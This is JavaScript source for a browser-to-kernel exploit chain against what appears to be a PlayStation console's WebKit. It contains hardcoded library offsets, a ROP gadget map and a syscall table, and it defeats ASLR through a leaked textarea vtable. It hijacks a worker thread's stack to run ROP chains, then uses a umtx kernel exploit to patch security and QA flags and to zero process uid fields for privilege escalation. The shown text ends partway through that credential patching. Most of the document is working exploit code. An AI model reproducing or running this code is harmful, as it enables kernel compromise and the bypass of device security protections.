const OFFSET_wk_vtable_first_element     = 0x00269B70;
const OFFSET_wk_memset_import            = 0x028D8DB0;
const OFFSET_wk___stack_chk_guard_import = 0x028D8A90;

const OFFSET_lk___stack_chk_guard        = 0x0006D1D0;
const OFFSET_lk_pthread_create_name_np   = 0x00001C40;
const OFFSET_lk_pthread_join             = 0x000310A0;
const OFFSET_lk_pthread_exit             = 0x00021560;
const OFFSET_lk__thread_list             = 0x00064208;
const OFFSET_lk_sleep                    = 0x00024920;
const OFFSET_lk_sceKernelGetCurrentCpu   = 0x00002770;

const OFFSET_lc_memset                   = 0x00014D70;
const OFFSET_lc_setjmp                   = 0x0005B420;
const OFFSET_lc_longjmp                  = 0x0005B470;

const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;

const SYS_READ                = 0x003;
const SYS_WRITE               = 0x004;
const SYS_CLOSE               = 0x006;
const SYS_GETPID              = 0x014;
const SYS_GETUID              = 0x018;
const SYS_ACCEPT              = 0x01E;
const SYS_IOCTL               = 0x036;
const SYS_SOCKET              = 0x061;
const SYS_CONNECT             = 0x062;
const SYS_BIND                = 0x068;
const SYS_SETSOCKOPT          = 0x069;
const SYS_LISTEN              = 0x06A;
const SYS_GETSOCKOPT          = 0x076;
const SYS_NANOSLEEP           = 0x0F0;
const SYS_KQUEUE              = 0x16A;
const SYS_RTPRIO_THREAD       = 0x1D2;
const SYS_MMAP                = 0x1DD;
const SYS_PS4_CPUSET_SETAFFINITY = 0x1E8;
const SYS_JITSHM_CREATE       = 0x215;
const SYS_JITSHM_ALIAS        = 0x216;
const SYS_DYNLIB_DLSYM        = 0x24F;
const SYS_PIPE2               = 0x2AF;
const SYS_SCHED_YIELD         = 0x14B;
const SYS__UMTX_OP            = 0x1C6;
const SYS_FTRUNCATE           = 0x1E0;
const SYS_FSTAT               = 0x0BD;
const SYS_IS_IN_SANDBOX       = 0x249;

let wk_gadgetmap = {
	"ret": 				0x00000042,
	"pop rdi": 			0x000A9D2E,
	"pop rsi": 			0x000463CC,
	"pop rdx": 			0x000F3571,
	"pop rcx": 			0x000016C2,
	"pop r8": 			0x00F537AF,
	"pop r9": 			0x00142136,
	"pop rax": 			0x0004D430,
	"pop rsp": 			0x001C9BB4,

	"mov [rdi], rsi": 	0x0036BF40,
	"mov [rdi], rax": 	0x000D2987,
	"mov [rdi], eax": 	0x000004D4,

	"infloop": 			0x000172C1,

	//branching specific gadgets
	"cmp [rcx], eax": 	0x00690582,
	"sete al": 			0x0001C273,
	"seta al": 			0x001F369A,
	"setb al": 			0x00041161,
	"setg al": 			0x001F36CE,
	"setl al": 			0x007C140C,
	"shl rax, 3": 		0x019B1DE3,
	"add rax, rcx": 	0x000DA1CE,
	"mov rax, [rax]": 	0x000B465C,
	"inc dword [rax]": 	0x00044BDA,
};

let syscall_map = {
	0x001: 0x00034F5A, // sys_exit
	0x002: 0x00036900, // sys_fork
	0x003: 0x00034B20, // sys_read
	0x004: 0x00034A80, // sys_write
	0x005: 0x00035120, // sys_open
	0x006: 0x00035750, // sys_close
	0x007: 0x00034340, // sys_wait4
	0x00A: 0x00036440, // sys_unlink
	0x00C: 0x00035DD0, // sys_chdir
	0x00F: 0x000357D0, // sys_chmod
	0x014: 0x00034CA0, // sys_getpid
	0x017: 0x000347A0, // sys_setuid
	0x018: 0x00035DB0, // sys_getuid
	0x019: 0x00035160, // sys_geteuid
	0x01B: 0x00035200, // sys_recvmsg
	0x01C: 0x00035430, // sys_sendmsg
	0x01D: 0x00035F80, // sys_recvfrom
	0x01E: 0x000346A0, // sys_accept
	0x01F: 0x000344C0, // sys_getpeername
	0x020: 0x000365E0, // sys_getsockname
	0x021: 0x00036100, // sys_access
	0x022: 0x00036280, // sys_chflags
	0x023: 0x00035C50, // sys_fchflags
	0x024: 0x00036B30, // sys_sync
	0x025: 0x00035100, // sys_kill
	0x027: 0x00034BA0, // sys_getppid
	0x029: 0x00036160, // sys_dup
	0x02A: 0x00034AF0, // sys_compat10.pipe
	0x02B: 0x000367A0, // sys_getegid
	0x02C: 0x00036AF0, // sys_profil
	0x02F: 0x00034640, // sys_getgid
	0x031: 0x00034620, // sys_getlogin
	0x032: 0x00035EB0, // sys_setlogin
	0x035: 0x00034860, // sys_sigaltstack
	0x036: 0x000349C0, // sys_ioctl
	0x037: 0x00035C90, // sys_reboot
	0x038: 0x00035B90, // sys_revoke
	0x03B: 0x000353ED, // sys_execve
	0x041: 0x00035830, // sys_msync
	0x049: 0x00035020, // sys_munmap
	0x04A: 0x00035D90, // sys_mprotect
	0x04B: 0x00034F10, // sys_madvise
	0x04E: 0x000350E0, // sys_mincore
	0x04F: 0x000345A0, // sys_getgroups
	0x050: 0x00034B40, // sys_setgroups
	0x053: 0x00034580, // sys_setitimer
	0x056: 0x000343A0, // sys_getitimer
	0x059: 0x00035BF0, // sys_getdtablesize
	0x05A: 0x00036000, // sys_dup2
	0x05C: 0x00035630, // sys_fcntl
	0x05D: 0x00035180, // sys_select
	0x05F: 0x000345E0, // sys_fsync
	0x060: 0x00035510, // sys_setpriority
	0x061: 0x00034D60, // sys_socket
	0x062: 0x00035DF0, // sys_connect
	0x063: 0x00036760, // sys_netcontrol
	0x064: 0x00034360, // sys_getpriority
	0x065: 0x00036380, // sys_netabort
	0x066: 0x00036700, // sys_netgetsockinfo
	0x068: 0x00036400, // sys_bind
	0x069: 0x00035670, // sys_setsockopt
	0x06A: 0x00034960, // sys_listen
	0x071: 0x00035970, // sys_socketex
	0x072: 0x00035340, // sys_socketclose
	0x074: 0x00036B10, // sys_gettimeofday
	0x075: 0x00036BF0, // sys_getrusage
	0x076: 0x00034320, // sys_getsockopt
	0x078: 0x000355B0, // sys_readv
	0x079: 0x00035410, // sys_writev
	0x07A: 0x00036060, // sys_settimeofday
	0x07C: 0x00034FA0, // sys_fchmod
	0x07D: 0x00035810, // sys_netgetiflist
	0x07E: 0x000366E0, // sys_setreuid
	0x07F: 0x00035300, // sys_setregid
	0x080: 0x00036260, // sys_rename
	0x083: 0x00035280, // sys_flock
	0x085: 0x00036B50, // sys_sendto
	0x086: 0x00036980, // sys_shutdown
	0x087: 0x00035D10, // sys_socketpair
	0x088: 0x00035AB0, // sys_mkdir
	0x089: 0x00034D00, // sys_rmdir
	0x08A: 0x00034210, // sys_utimes
	0x08C: 0x000366A0, // sys_adjtime
	0x08D: 0x000357F0, // sys_kqueueex
	0x093: 0x00035A50, // sys_setsid
	0x0A5: 0x00034540, // sys_sysarch
	0x0B6: 0x000364E0, // sys_setegid
	0x0B7: 0x00034380, // sys_seteuid
	0x0BC: 0x00036540, // sys_stat
	0x0BD: 0x00036940, // sys_fstat
	0x0BE: 0x00035320, // sys_lstat
	0x0BF: 0x00034A20, // sys_pathconf
	0x0C0: 0x00035CD0, // sys_fpathconf
	0x0C2: 0x00035260, // sys_getrlimit
	0x0C3: 0x00034E40, // sys_setrlimit
	0x0C4: 0x00036460, // sys_getdirentries
	0x0CA: 0x00036240, // sys___sysctl
	0x0CB: 0x000358F0, // sys_mlock
	0x0CC: 0x000362E0, // sys_munlock
	0x0CE: 0x00034DA0, // sys_futimes
	0x0D1: 0x00035380, // sys_poll
	0x0E8: 0x00034440, // sys_clock_gettime
	0x0E9: 0x000358B0, // sys_clock_settime
	0x0EA: 0x000368B0, // sys_clock_getres
	0x0EB: 0x00036480, // sys_ktimer_create
	0x0EC: 0x00034C00, // sys_ktimer_delete
	0x0ED: 0x00036960, // sys_ktimer_settime
	0x0EE: 0x00035E10, // sys_ktimer_gettime
	0x0EF: 0x00034FC0, // sys_ktimer_getoverrun
	0x0F0: 0x00036340, // sys_nanosleep
	0x0F1: 0x00035B70, // sys_number241
	0x0F2: 0x00034B60, // sys_number242
	0x0F3: 0x000359F0, // sys_number243
	0x0F7: 0x000363E0, // sys_number247
	0x0FB: 0x00034F39, // sys_rfork
	0x0FD: 0x00035FA0, // sys_issetugid
	0x110: 0x00036740, // sys_getdents
	0x121: 0x00035E50, // sys_preadv
	0x122: 0x000353A0, // sys_pwritev
	0x136: 0x000350A0, // sys_getsid
	0x13B: 0x00036560, // sys_aio_suspend
	0x144: 0x00034C20, // sys_mlockall
	0x145: 0x00036020, // sys_munlockall
	0x147: 0x00034D20, // sys_sched_setparam
	0x148: 0x00035990, // sys_sched_getparam
	0x149: 0x000344E0, // sys_sched_setscheduler
	0x14A: 0x00035360, // sys_sched_getscheduler
	0x14B: 0x000351C0, // sys_sched_yield
	0x14C: 0x00034760, // sys_sched_get_priority_max
	0x14D: 0x00034880, // sys_sched_get_priority_min
	0x14E: 0x00034AB0, // sys_sched_rr_get_interval
	0x154: 0x00034270, // sys_sigprocmask
	0x155: 0x000342B0, // sys_sigsuspend
	0x157: 0x00036180, // sys_sigpending
	0x159: 0x000362A0, // sys_sigtimedwait
	0x15A: 0x00035EE0, // sys_sigwaitinfo
	0x16A: 0x000364C0, // sys_kqueue
	0x16B: 0x00034720, // sys_kevent
	0x17B: 0x000346C0, // sys_mtypeprotect
	0x188: 0x000347E0, // sys_uuidgen
	0x189: 0x00036C30, // sys_sendfile
	0x18D: 0x00034C80, // sys_fstatfs
	0x190: 0x00034840, // sys_ksem_close
	0x191: 0x000355D0, // sys_ksem_post
	0x192: 0x00035E70, // sys_ksem_wait
	0x193: 0x00036C10, // sys_ksem_trywait
	0x194: 0x00034980, // sys_ksem_init
	0x195: 0x000363A0, // sys_ksem_open
	0x196: 0x00036080, // sys_ksem_unlink
	0x197: 0x00034800, // sys_ksem_getvalue
	0x198: 0x00036040, // sys_ksem_destroy
	0x1A0: 0x00036520, // sys_sigaction
	0x1A1: 0x000361C0, // sys_sigreturn
	0x1A5: 0x00034EA4, // sys_getcontext
	0x1A6: 0x00035BD0, // sys_setcontext
	0x1A7: 0x00035CF0, // sys_swapcontext
	0x1AD: 0x00034EF0, // sys_sigwait
	0x1AE: 0x000345C0, // sys_thr_create
	0x1AF: 0x00034920, // sys_thr_exit
	0x1B0: 0x000352C0, // sys_thr_self
	0x1B1: 0x00034940, // sys_thr_kill
	0x1B9: 0x00035F60, // sys_ksem_timedwait
	0x1BA: 0x00034290, // sys_thr_suspend
	0x1BB: 0x00034BC0, // sys_thr_wake
	0x1BC: 0x00035C30, // sys_kldunloadf
	0x1C6: 0x00034310, // sys__umtx_op
	0x1C7: 0x00036660, // sys_thr_new
	0x1C8: 0x000365C0, // sys_sigqueue
	0x1D0: 0x00035F20, // sys_thr_set_name
	0x1D2: 0x000354D0, // sys_rtprio_thread
	0x1DB: 0x00034C60, // sys_pread
	0x1DC: 0x00035D70, // sys_pwrite
	0x1DD: 0x00036640, // sys_mmap
	0x1DE: 0x00036140, // sys_lseek
	0x1DF: 0x000351E0, // sys_truncate
	0x1E0: 0x00034C40, // sys_ftruncate
	0x1E1: 0x00034230, // sys_thr_kill2
	0x1E2: 0x00036BB0, // sys_shm_open
	0x1E3: 0x00036620, // sys_shm_unlink
	0x1E6: 0x00034E60, // sys_cpuset_getid
	0x1E7: 0x00036A20, // sys_ps4_cpuset_getaffinity
	0x1E8: 0x000361E0, // sys_ps4_cpuset_setaffinity
	0x1F3: 0x00034600, // sys_openat
	0x203: 0x00035CB0, // sys___cap_rights_get
	0x20A: 0x000356F0, // sys_pselect
	0x214: 0x000357B0, // sys_regmgr_call
	0x215: 0x00035530, // sys_jitshm_create
	0x216: 0x00035B10, // sys_jitshm_alias
	0x217: 0x00034A00, // sys_dl_get_list
	0x218: 0x00035850, // sys_dl_get_info
	0x21A: 0x00035790, // sys_evf_create
	0x21B: 0x00034BE0, // sys_evf_delete
	0x21C: 0x00035B30, // sys_evf_open
	0x21D: 0x00035710, // sys_evf_close
	0x21E: 0x000359D0, // sys_evf_wait
	0x21F: 0x000361A0, // sys_evf_trywait
	0x220: 0x00035B50, // sys_evf_set
	0x221: 0x000360C0, // sys_evf_clear
	0x222: 0x00034ED0, // sys_evf_cancel
	0x223: 0x000359B0, // sys_query_memory_protection
	0x224: 0x000352A0, // sys_batch_map
	0x225: 0x000354B0, // sys_osem_create
	0x226: 0x00034480, // sys_osem_delete
	0x227: 0x00034400, // sys_osem_open
	0x228: 0x00036A00, // sys_osem_close
	0x229: 0x00035A90, // sys_osem_wait
	0x22A: 0x000360A0, // sys_osem_trywait
	0x22B: 0x00035D30, // sys_osem_post
	0x22C: 0x00035610, // sys_osem_cancel
	0x22D: 0x000353C0, // sys_namedobj_create
	0x22E: 0x000350C0, // sys_namedobj_delete
	0x22F: 0x00036C90, // sys_set_vm_container
	0x230: 0x00034B80, // sys_debug_init
	0x233: 0x000354F0, // sys_opmc_enable
	0x234: 0x00034560, // sys_opmc_disable
	0x235: 0x00035570, // sys_opmc_set_ctl
	0x236: 0x00035590, // sys_opmc_set_ctr
	0x237: 0x00035FE0, // sys_opmc_get_ctr
	0x23C: 0x00034E00, // sys_virtual_query
	0x249: 0x00036420, // sys_is_in_sandbox
	0x24A: 0x00034FE0, // sys_dmem_container
	0x24B: 0x00035890, // sys_get_authinfo
	0x24C: 0x000343E0, // sys_mname
	0x24F: 0x000349E0, // sys_dynlib_dlsym
	0x250: 0x00034CE0, // sys_dynlib_get_list
	0x251: 0x00036780, // sys_dynlib_get_info
	0x252: 0x00035690, // sys_dynlib_load_prx
	0x253: 0x00034680, // sys_dynlib_unload_prx
	0x254: 0x00036500, // sys_dynlib_do_copy_relocations
	0x256: 0x00035490, // sys_dynlib_get_proc_param
	0x257: 0x000367E0, // sys_dynlib_process_needed_and_relocate
	0x258: 0x00034250, // sys_sandbox_path
	0x259: 0x00034DC0, // sys_mdbg_service
	0x25A: 0x00035450, // sys_randomized_path
	0x25B: 0x000362C0, // sys_rdup
	0x25C: 0x000348C0, // sys_dl_get_metadata
	0x25D: 0x00035000, // sys_workaround8849
	0x25E: 0x000347C0, // sys_is_development_mode
	0x25F: 0x00035930, // sys_get_self_auth_info
	0x260: 0x00036BD0, // sys_dynlib_get_info_ex
	0x262: 0x00036C70, // sys_budget_get_ptype
	0x263: 0x00034AD0, // sys_get_paging_stats_of_all_threads
	0x264: 0x000369E0, // sys_get_proc_type_info
	0x265: 0x000341F0, // sys_get_resident_count
	0x267: 0x00035550, // sys_get_resident_fmem_count
	0x268: 0x00036600, // sys_thr_get_name
	0x269: 0x00035C10, // sys_set_gpo
	0x26A: 0x00035910, // sys_get_paging_stats_of_all_objects
	0x26B: 0x00034700, // sys_test_debug_rwmem
	0x26C: 0x00034820, // sys_free_stack
	0x26E: 0x00034420, // sys_ipmimgr_call
	0x26F: 0x00035870, // sys_get_gpo
	0x270: 0x00036C50, // sys_get_vm_map_timestamp
	0x271: 0x00036200, // sys_opmc_set_hw
	0x272: 0x00034D40, // sys_opmc_get_hw
	0x273: 0x000343C0, // sys_get_cpu_usage_all
	0x274: 0x00035A30, // sys_mmap_dmem
	0x275: 0x00034DE0, // sys_physhm_open
	0x276: 0x000355F0, // sys_physhm_unlink
	0x278: 0x00036B90, // sys_thr_suspend_ucontext
	0x279: 0x00035080, // sys_thr_resume_ucontext
	0x27A: 0x00035040, // sys_thr_get_ucontext
	0x27B: 0x00035140, // sys_thr_set_ucontext
	0x27C: 0x00034D80, // sys_set_timezone_info
	0x27D: 0x00035AD0, // sys_set_phys_fmem_limit
	0x27E: 0x00034E80, // sys_utc_to_localtime
	0x27F: 0x00036CB0, // sys_localtime_to_utc
	0x280: 0x00035E30, // sys_set_uevt
	0x281: 0x000349A0, // sys_get_cpu_usage_proc
	0x282: 0x00035220, // sys_get_map_statistics
	0x283: 0x00035FC0, // sys_set_chicken_switches
	0x286: 0x000368E0, // sys_get_kernel_mem_statistics
	0x287: 0x00035AF0, // sys_get_sdk_compiled_version
	0x288: 0x00034460, // sys_app_state_change
	0x289: 0x00036680, // sys_dynlib_get_obj_member
	0x28C: 0x00034500, // sys_process_terminate
	0x28D: 0x00034CC0, // sys_blockpool_open
	0x28E: 0x00034A60, // sys_blockpool_map
	0x28F: 0x000364A0, // sys_blockpool_unmap
	0x290: 0x000360E0, // sys_dynlib_get_info_for_libdbg
	0x291: 0x000351A0, // sys_blockpool_batch
	0x292: 0x00034900, // sys_fdatasync
	0x293: 0x00034E20, // sys_dynlib_get_list2
	0x294: 0x00036B70, // sys_dynlib_get_info2
	0x295: 0x00036320, // sys_aio_submit
	0x296: 0x000348A0, // sys_aio_multi_delete
	0x297: 0x000356D0, // sys_aio_multi_wait
	0x298: 0x00034780, // sys_aio_multi_poll
	0x299: 0x00036220, // sys_aio_get_data
	0x29A: 0x000356B0, // sys_aio_multi_cancel
	0x29B: 0x00034660, // sys_get_bio_usage_all
	0x29C: 0x00035D50, // sys_aio_create
	0x29D: 0x000367C0, // sys_aio_submit_cmd
	0x29E: 0x000366C0, // sys_aio_init
	0x29F: 0x00036120, // sys_get_page_table_stats
	0x2A0: 0x00036580, // sys_dynlib_get_list_for_libdbg
	0x2A1: 0x00036720, // sys_blockpool_move
	0x2A2: 0x000365A0, // sys_virtual_query_all
	0x2A3: 0x00035650, // sys_reserve_2mb_page
	0x2A4: 0x00035F00, // sys_cpumode_yield
	0x2A5: 0x00035A10, // sys_wait6
	0x2A6: 0x00035470, // sys_cap_rights_limit
	0x2A7: 0x00034A40, // sys_cap_ioctls_limit
	0x2A8: 0x00035770, // sys_cap_ioctls_get
	0x2A9: 0x00035F40, // sys_cap_fcntls_limit
	0x2AA: 0x000346E0, // sys_cap_fcntls_get
	0x2AB: 0x00036A40, // sys_bindat
	0x2AC: 0x00035240, // sys_connectat
	0x2AD: 0x000344A0, // sys_chflagsat
	0x2AE: 0x000342F0, // sys_accept4
	0x2AF: 0x000348E0, // sys_pipe2
	0x2B0: 0x000352E0, // sys_aio_mlock
	0x2B1: 0x000369C0, // sys_procctl
	0x2B2: 0x00035C70, // sys_ppoll
	0x2B3: 0x00035BB0, // sys_futimens
	0x2B4: 0x00036360, // sys_utimensat
	0x2B5: 0x000358D0, // sys_numa_getaffinity
	0x2B6: 0x00035730, // sys_numa_setaffinity
	0x2C1: 0x00034740, // sys_get_phys_page_size
	0x2C9: 0x000369A0, // sys_get_ppr_sdk_compiled_version
	0x2CC: 0x00034F80, // sys_openintr
	0x2CD: 0x00035A70, // sys_dl_get_info_2
	0x2CE: 0x00035060, // sys_acinfo_add
	0x2CF: 0x000342D0, // sys_acinfo_delete
	0x2D0: 0x00036300, // sys_acinfo_get_all_for_coredump
	0x2D1: 0x000363C0, // sys_ampr_ctrl_debug
};

// Kernel stack offsets
const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;

// Kernel text-relative offsets
const OFFSET_KERNEL_DATA                        = 0x00C40000;
const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x00599CF2;
const OFFSET_KERNEL_ALLPROC                     = 0x0355DD00; // data = 0x0290DD00
const OFFSET_KERNEL_SECURITY_FLAGS              = 0x072866EC; // data = 0x066366EC
const OFFSET_KERNEL_TARGETID                    = 0x072866F5; // data = 0x066366F5
const OFFSET_KERNEL_QA_FLAGS                    = 0x07286710; // data = 0x06636710
const OFFSET_KERNEL_UTOKEN_FLAGS                = 0x07286778; // data = 0x06636778
const OFFSET_KERNEL_PRISON0                     = 0x02A635B0; // data = 0x01E13470
const OFFSET_KERNEL_ROOTVNODE                   = 0x07493510; // data = 0x06843510
const OFFSET_KERNEL_PS4SDK                      = 0x023D9048; // data = 0x01789048 //ok sdkps4
//const OFFSET_KERNEL_PS5SDK                      = 0x023D90A8; // data = 0x017890a8 //ok sdkps5
//const OFFSET_KERNEL_PS5UDP                      = 0x07286810; // data = 0x06636810 //ok udpps5

let nogc = [];

let worker = new Worker("rop_slave.js");

//Make sure worker is alive?
async function wait_for_worker() {
    let p1 = await new Promise((resolve) => {
        const channel = new MessageChannel();
        channel.port1.onmessage = () => {
            channel.port1.close();
            resolve(1);
        }
        worker.postMessage(0, [channel.port2]);
    });
    return p1;
}

/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} buf 
 * @param {number} family 
 * @param {number} port 
 * @param {number} addr 
 */
function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

/** 
 * @param {number} port
 * @returns {number}
 */
function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}


/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} libKernelBase 
 * @returns 
 */
function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}


/**
 * @enum {number}
 */
const LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,

    FLAG_TEMP: 0x1000,
};

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;


/**
 * @param {UserlandRW} p 
 * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
 */
async function prepare(p) {
    //ASLR defeat patsy (former vtable buddy)
    let textArea = document.createElement("textarea");

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);

    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    /**
     * @param {number} sz 
     * @param {number} type 
     * @returns 
     */
    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        // @ts-ignore
        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        // nogc.push(bufView);
        /** @type {any} */
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    // Make sure worker is alive?
    async function wait_for_worker() {
        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        return p1;
    }

    let worker = new Worker("rop_slave.js");
    
    await wait_for_worker();

    let worker_stack = find_worker(p, libKernelBase);
    let original_context = malloc(0x40);

    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        //save context for later
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        //Restore earlier saved context but with a twist.
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        //overwrite rop_slave's return address
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        if (p1 === 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    /** @type {WebkitPrimitives} */
    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    let pid = await chain.syscall(SYS_GETPID);

    //Sanity check
    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }

    return { p: p2, chain: chain };
}

async function main(userlandRW) {
    const debug = false;

    const { p, chain } = await prepare(userlandRW);
    if (debug) debug_log("Chain initialized", LogLevel.DEBUG);

    var load_payload_into_elf_store_from_local_file = async function (filename) {
        debug_log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
        const response = await fetch('payloads/' + filename);
        if (!response.ok) {
            throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
        }

        const data = await response.arrayBuffer();

        let byteArray;
        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
            byteArray = new Uint8Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {
            byteArray = new Uint16Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {
            byteArray = new Uint32Array(data);
        } else {
            throw new Error(`Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`);
        }

        // zero out elf_store.backing
        elf_store.backing.fill(0);

        elf_store.backing.set(byteArray);
        return byteArray.byteLength;
    }

    let SIZE_ELF_HEADER = 0x40;
    let SIZE_ELF_PROGRAM_HEADER = 0x38;
    var elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000; // 16MB
    var elf_store = p.malloc(elf_store_size, 1);

        var krw = await runUmtx2Exploit(p, chain, log);

        function get_kaddr(offset) {
            return krw.ktextBase.add32(offset);
        }

        // Set security flags
        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);

        // Set targetid to DEX
        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);

        // Set qa flags and utoken flags for debug menu enable
        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);

        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
        debug_log("Enabled debug menu", LogLevel.INFO);

        // Patch creds
        let cur_uid = await chain.syscall(SYS_GETUID);
        debug_log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);

        await krw.write4(krw.procUcredAddr.add32(0x04), 0); // cr_uid
        await krw.write4(krw.procUcredAddr.add32(0x08), 0); // cr_ruid
        await krw.write4(krw.procUcredAddr.add32(0x0C), 0); // cr_svuid
        await krw.write4(krw.procUcredAddr.add32(0x10), 1); // cr_ngroups
